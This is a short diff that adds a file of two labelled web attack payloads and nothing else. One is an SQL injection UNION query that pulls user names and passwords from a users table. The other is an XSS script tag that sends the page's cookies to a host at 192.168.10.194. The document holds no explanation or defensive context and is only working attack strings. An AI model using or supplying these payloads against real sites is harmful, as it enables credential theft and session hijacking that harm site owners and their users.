@@ -1,0 +1,5 @@
+sqli
+1' union SELECT NULL,concat(user,':',password) FROM users #
+
+xss
+<script>fetch('http://192.168.10.194/'+document.cookie);</script>
